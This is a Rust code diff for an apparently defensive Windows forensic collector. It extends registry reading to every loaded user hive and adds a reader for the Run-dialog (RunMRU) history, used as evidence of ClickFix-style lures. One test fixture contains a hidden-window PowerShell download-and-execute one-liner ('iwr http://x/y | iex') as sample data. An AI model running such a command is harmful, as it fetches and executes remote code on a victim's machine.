@@ -9,7 +9,7 @@
 //! Judging what is normal for each mechanism is NOT done here — that knowledge lives
 //! in `cairn-heur` (analyzers never touch the host; collectors never judge).
 
-use cairn_core::record::PersistenceRecord;
+use cairn_core::record::{PersistenceRecord, RegValueRecord};
 use chrono::{DateTime, Utc};
 
 /// Registry root a catalog entry lives under.
@@ -17,6 +17,10 @@ use chrono::{DateTime, Utc};
 pub enum Hive {
     Hklm,
     Hkcu,
+    /// HKEY_USERS; keys start with a user SID. Per-user (HKCU) catalog entries are
+    /// read here for every loaded user hive, so an elevated run under a helpdesk
+    /// account still sees the logged-on victim's Run keys, COM hijacks and RunMRU.
+    Hku,
 }
 
 impl Hive {
@@ -24,6 +28,7 @@ impl Hive {
         match self {
             Hive::Hklm => "HKLM",
             Hive::Hkcu => "HKCU",
+            Hive::Hku => "HKU",
         }
     }
 }
@@ -48,6 +53,33 @@ pub type KeyValues = (Vec<(String, RegData)>, Option<DateTime<Utc>>);
 pub trait RegRead {
     fn values(&self, hive: Hive, key: &str) -> Option<KeyValues>;
     fn subkeys(&self, hive: Hive, key: &str) -> Vec<String>;
+}
+
+/// SIDs of the interactive user hives loaded under HKEY_USERS (`S-1-5-21-...`,
+/// excluding the `_Classes` companions). Service and system profiles are skipped.
+pub fn loaded_user_sids(reg: &dyn RegRead) -> Vec<String> {
+    let mut sids: Vec<String> = reg
+        .subkeys(Hive::Hku, "")
+        .into_iter()
+        .filter(|k| {
+            k.to_ascii_uppercase().starts_with("S-1-5-21-")
+                && !k.to_ascii_lowercase().ends_with("_classes")
+        })
+        .collect();
+    sids.sort();
+    sids
+}
+
+/// Where to read a per-user key: each loaded user hive under HKU, or HKCU when no
+/// user hive is visible (non-Windows tests, or HKU unreadable).
+fn user_roots(reg: &dyn RegRead, key: &str) -> Vec<(Hive, String)> {
+    let sids = loaded_user_sids(reg);
+    if sids.is_empty() {
+        return vec![(Hive::Hkcu, key.to_string())];
+    }
+    sids.into_iter()
+        .map(|sid| (Hive::Hku, format!("{sid}\\{key}")))
+        .collect()
 }
 
 /// What to take from a catalog key.
@@ -110,6 +142,21 @@ const WINLOGON: &str = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";
 /// The extended ASEP catalog. Mechanism names are the contract with
 /// `cairn_heur::persist` (see `asep_mitre` / `asep_signal` there).
 pub const CATALOG: &[AsepSpec] = &[
+    // T1547.001 — per-user Run keys, read from every loaded user hive (see Hive::Hku).
+    spec(
+        "run_key",
+        Hive::Hkcu,
+        r"Software\Microsoft\Windows\CurrentVersion\Run",
+        Select::AllValues,
+        Target::Command,
+    ),
+    spec(
+        "run_key",
+        Hive::Hkcu,
+        r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
+        Select::AllValues,
+        Target::Command,
+    ),
     // T1547.001 — 32-bit Run keys and policy-driven Run keys (missed by run_key reader).
     spec(
         "run_key",
@@ -356,7 +403,25 @@ pub const CATALOG: &[AsepSpec] = &[
 /// `binary_path` is filled only for [`Target::Dll`] (via `system_root`); command-line
 /// targets are resolved later by persist.rs's candidate model.
 pub fn read_spec(reg: &dyn RegRead, spec: &AsepSpec, system_root: &str) -> Vec<PersistenceRecord> {
-    let base = format!("{}\\{}", spec.hive.prefix(), spec.key);
+    let roots = match spec.hive {
+        Hive::Hkcu => user_roots(reg, spec.key),
+        h => vec![(h, spec.key.to_string())],
+    };
+    roots
+        .into_iter()
+        .flat_map(|(hive, key)| read_spec_at(reg, spec, hive, &key, system_root))
+        .collect()
+}
+
+/// [`read_spec`] for one concrete (hive, key) root.
+fn read_spec_at(
+    reg: &dyn RegRead,
+    spec: &AsepSpec,
+    hive: Hive,
+    spec_key: &str,
+    system_root: &str,
+) -> Vec<PersistenceRecord> {
+    let base = format!("{}\\{}", hive.prefix(), spec_key);
     let mut out = Vec::new();
     let mut push = |location: String, value: String, data: String, lw: Option<DateTime<Utc>>| {
         let data = data.trim().trim_end_matches('\0').trim().to_string();
@@ -381,7 +446,7 @@ pub fn read_spec(reg: &dyn RegRead, spec: &AsepSpec, system_root: &str) -> Vec<P
     };
     match spec.select {
         Select::AllValues => {
-            if let Some((values, lw)) = reg.values(spec.hive, spec.key) {
+            if let Some((values, lw)) = reg.values(hive, spec_key) {
                 for (name, data) in values {
                     for item in items(&data, false) {
                         push(base.clone(), name.clone(), item, lw);
@@ -390,7 +455,7 @@ pub fn read_spec(reg: &dyn RegRead, spec: &AsepSpec, system_root: &str) -> Vec<P
             }
         }
         Select::Value { name, split_list } => {
-            if let Some((values, lw)) = reg.values(spec.hive, spec.key) {
+            if let Some((values, lw)) = reg.values(hive, spec_key) {
                 for (n, data) in values {
                     if !n.eq_ignore_ascii_case(name) {
                         continue;
@@ -403,9 +468,9 @@ pub fn read_spec(reg: &dyn RegRead, spec: &AsepSpec, system_root: &str) -> Vec<P
             }
         }
         Select::SubkeyValue(value_name) => {
-            for sub in reg.subkeys(spec.hive, spec.key) {
-                let key = format!("{}\\{}", spec.key, sub);
-                if let Some((values, lw)) = reg.values(spec.hive, &key) {
+            for sub in reg.subkeys(hive, spec_key) {
+                let key = format!("{}\\{}", spec_key, sub);
+                if let Some((values, lw)) = reg.values(hive, &key) {
                     for (n, data) in values {
                         if n.eq_ignore_ascii_case(value_name) {
                             for item in items(&data, false) {
@@ -417,9 +482,9 @@ pub fn read_spec(reg: &dyn RegRead, spec: &AsepSpec, system_root: &str) -> Vec<P
             }
         }
         Select::SubkeyChildDefault(child) => {
-            for sub in reg.subkeys(spec.hive, spec.key) {
-                let key = format!("{}\\{}\\{}", spec.key, sub, child);
-                if let Some((values, lw)) = reg.values(spec.hive, &key) {
+            for sub in reg.subkeys(hive, spec_key) {
+                let key = format!("{}\\{}\\{}", spec_key, sub, child);
+                if let Some((values, lw)) = reg.values(hive, &key) {
                     for (n, data) in values {
                         if n.is_empty() {
                             for item in items(&data, false) {
@@ -489,13 +554,70 @@ fn expand_system_root(s: &str, system_root: &str) -> String {
     s.to_string()
 }
 
+/// Explorer's Run dialog (Win+R) history. ClickFix / "paste-and-run" lures (T1204.004)
+/// make the user paste a command here, so its entries are direct evidence of what was
+/// run. Not persistence: these records go out as `RegValue`, not `Persistence`.
+pub const RUN_MRU_KEY: &str = r"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU";
+
+/// One `RegValueRecord` per Run-dialog entry of every loaded user, most recent first
+/// (`MRUList` order). The trailing `\1` Explorer appends to each command is removed.
+/// `last_write` is the key's LastWrite, i.e. when the most recent entry was typed.
+pub fn read_run_mru(reg: &dyn RegRead) -> Vec<RegValueRecord> {
+    let mut out = Vec::new();
+    for (hive, key) in user_roots(reg, RUN_MRU_KEY) {
+        let Some((values, lw)) = reg.values(hive, &key) else {
+            continue;
+        };
+        let order: String = values
+            .iter()
+            .find(|(n, _)| n.eq_ignore_ascii_case("MRUList"))
+            .and_then(|(_, d)| match d {
+                RegData::Str(s) => Some(s.clone()),
+                _ => None,
+            })
+            .unwrap_or_default();
+        let mut entries: Vec<(usize, String, String)> = values
+            .iter()
+            .filter(|(n, _)| !n.eq_ignore_ascii_case("MRUList"))
+            .filter_map(|(n, d)| match d {
+                RegData::Str(s) => {
+                    let cmd = s.strip_suffix("\\1").unwrap_or(s).trim().to_string();
+                    let rank = n
+                        .chars()
+                        .next()
+                        .and_then(|c| order.find(c))
+                        .unwrap_or(usize::MAX);
+                    (!cmd.is_empty()).then(|| (rank, n.clone(), cmd))
+                }
+                _ => None,
+            })
+            .collect();
+        entries.sort();
+        let (hive_label, key_path) = match key.split_once('\\') {
+            Some((sid, rest)) if hive == Hive::Hku => (format!("HKU\\{sid}"), rest.to_string()),
+            _ => (hive.prefix().to_string(), key.clone()),
+        };
+        for (_, name, cmd) in entries {
+            out.push(RegValueRecord {
+                hive: hive_label.clone(),
+                key: key_path.clone(),
+                value: name,
+                data: cmd,
+                last_write: lw,
+            });
+        }
+    }
+    out
+}
+
 /// Max bytes of a PowerShell profile kept in `command` for content inspection.
 const PROFILE_EXCERPT_BYTES: usize = 8 * 1024;
 
 /// The PowerShell profile scripts that run at every PowerShell start (T1546.013):
-/// all-users profiles for Windows PowerShell and PowerShell 7, and the current user's
-/// profiles under Documents. Missing env vars just drop their entries.
-pub fn ps_profile_paths(env: impl Fn(&str) -> Option<String>) -> Vec<String> {
+/// all-users profiles for Windows PowerShell and PowerShell 7, and the per-user
+/// profiles under Documents of the current user and of every profile dir in `homes`.
+/// Missing env vars just drop their entries; duplicates are removed.
+pub fn ps_profile_paths(env: impl Fn(&str) -> Option<String>, homes: &[String]) -> Vec<String> {
     let mut out = Vec::new();
     if let Some(root) = env("SystemRoot").or_else(|| env("windir")) {
         for f in ["profile.ps1", "Microsoft.PowerShell_profile.ps1"] {
@@ -507,10 +629,15 @@ pub fn ps_profile_paths(env: impl Fn(&str) -> Option<String>) -> Vec<String> {
             out.push(format!(r"{pf}\PowerShell\7\{f}"));
         }
     }
-    if let Some(home) = env("USERPROFILE") {
+    let mut all_homes: Vec<String> = env("USERPROFILE").into_iter().collect();
+    all_homes.extend(homes.iter().cloned());
+    for home in all_homes {
         for dir in ["WindowsPowerShell", "PowerShell"] {
             for f in ["profile.ps1", "Microsoft.PowerShell_profile.ps1"] {
-                out.push(format!(r"{home}\Documents\{dir}\{f}"));
+                let p = format!(r"{home}\Documents\{dir}\{f}");
+                if !out.iter().any(|o: &String| o.eq_ignore_ascii_case(&p)) {
+                    out.push(p);
+                }
             }
         }
     }
@@ -555,14 +682,21 @@ pub fn read_ps_profiles(paths: &[String]) -> Vec<PersistenceRecord> {
 pub struct WinReg;
 
 #[cfg(windows)]
+fn predef(hive: Hive) -> winreg::RegKey {
+    use winreg::enums::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS};
+    winreg::RegKey::predef(match hive {
+        Hive::Hklm => HKEY_LOCAL_MACHINE,
+        Hive::Hkcu => HKEY_CURRENT_USER,
+        Hive::Hku => HKEY_USERS,
+    })
+}
+
+#[cfg(windows)]
 impl RegRead for WinReg {
     fn values(&self, hive: Hive, key: &str) -> Option<KeyValues> {
         use chrono::TimeZone;
-        use winreg::enums::{RegType, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};
-        let root = winreg::RegKey::predef(match hive {
-            Hive::Hklm => HKEY_LOCAL_MACHINE,
-            Hive::Hkcu => HKEY_CURRENT_USER,
-        });
+        use winreg::enums::RegType;
+        let root = predef(hive);
         let k = root.open_subkey(key).ok()?;
         let lw = k.query_info().ok().and_then(|info| {
             let st = info.get_last_write_time_system();
@@ -596,12 +730,8 @@ impl RegRead for WinReg {
     }
 
     fn subkeys(&self, hive: Hive, key: &str) -> Vec<String> {
-        use winreg::enums::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};
-        let root = winreg::RegKey::predef(match hive {
-            Hive::Hklm => HKEY_LOCAL_MACHINE,
-            Hive::Hkcu => HKEY_CURRENT_USER,
-        });
-        root.open_subkey(key)
+        predef(hive)
+            .open_subkey(key)
             .map(|k| k.enum_keys().flatten().collect())
             .unwrap_or_default()
     }
@@ -622,6 +752,7 @@ mod tests {
         match h {
             Hive::Hklm => 0,
             Hive::Hkcu => 1,
+            Hive::Hku => 2,
         }
     }
 
@@ -642,7 +773,11 @@ mod tests {
                 .map(|v| (v.clone(), None))
         }
         fn subkeys(&self, hive: Hive, key: &str) -> Vec<String> {
-            let prefix = format!("{}\\", key.to_ascii_lowercase());
+            let prefix = if key.is_empty() {
+                String::new()
+            } else {
+                format!("{}\\", key.to_ascii_lowercase())
+            };
             let mut subs: Vec<String> = self
                 .keys
                 .keys()
@@ -657,6 +792,78 @@ mod tests {
 
     fn s(v: &str) -> RegData {
         RegData::Str(v.to_string())
+    }
+
+    const SID: &str = "S-1-5-21-1111-2222-3333-1001";
+
+    /// With user hives loaded under HKU, per-user entries are read from each of them
+    /// (not from HKCU), and the `_Classes` companion hive is not mistaken for a user.
+    #[test]
+    fn per_user_entries_are_read_from_every_loaded_user_hive() {
+        let mut reg = FakeReg::default();
+        let other = "S-1-5-21-1111-2222-3333-1002";
+        for sid in [SID, other] {
+            reg.set(
+                Hive::Hku,
+                &format!(r"{sid}\Environment"),
+                "UserInitMprLogonScript",
+                s(&format!(r"C:\Users\{sid}\x.bat")),
+            );
+        }
+        reg.set(Hive::Hku, &format!(r"{SID}_Classes\CLSID"), "", s("x"));
+        reg.set(
+            Hive::Hku,
+            r"S-1-5-18\Environment",
+            "UserInitMprLogonScript",
+            s("svc"),
+        );
+        reg.set(
+            Hive::Hkcu,
+            r"Environment",
+            "UserInitMprLogonScript",
+            s("hkcu"),
+        );
+        let recs: Vec<_> = read_catalog(&reg, r"C:\Windows")
+            .into_iter()
+            .filter(|r| r.mechanism == "logon_script")
+            .collect();
+        assert_eq!(recs.len(), 2, "{recs:?}");
+        assert!(recs[0]
+            .location
+            .starts_with(r"HKU\s-1-5-21-1111-2222-3333-1001\"));
+        assert!(recs.iter().all(|r| r.command.as_deref() != Some("hkcu")));
+    }
+
+    #[test]
+    fn run_mru_is_ordered_most_recent_first_and_strips_suffix() {
+        let mut reg = FakeReg::default();
+        let key = format!(r"{SID}\{RUN_MRU_KEY}");
+        reg.set(Hive::Hku, &key, "a", s(r"notepad\1"));
+        reg.set(
+            Hive::Hku,
+            &key,
+            "b",
+            s(r"powershell -w h -c iwr http://x/y | iex\1"),
+        );
+        reg.set(Hive::Hku, &key, "MRUList", s("ba"));
+        let recs = read_run_mru(&reg);
+        assert_eq!(recs.len(), 2);
+        assert_eq!(recs[0].data, "powershell -w h -c iwr http://x/y | iex");
+        assert_eq!(recs[1].data, "notepad");
+        assert_eq!(recs[0].hive, r"HKU\s-1-5-21-1111-2222-3333-1001");
+        assert_eq!(
+            recs[0].key.to_ascii_lowercase(),
+            RUN_MRU_KEY.to_ascii_lowercase()
+        );
+    }
+
+    #[test]
+    fn run_mru_falls_back_to_hkcu() {
+        let mut reg = FakeReg::default();
+        reg.set(Hive::Hkcu, RUN_MRU_KEY, "a", s(r"cmd\1"));
+        let recs = read_run_mru(&reg);
+        assert_eq!(recs.len(), 1);
+        assert_eq!(recs[0].hive, "HKCU");
     }
 
     #[test]
@@ -831,7 +1038,7 @@ mod tests {
             "USERPROFILE" => Some(r"C:\Users\v".to_string()),
             _ => None,
         };
-        let paths = ps_profile_paths(env);
+        let paths = ps_profile_paths(env, &[]);
         assert!(
             paths.contains(&r"C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1".to_string())
         );
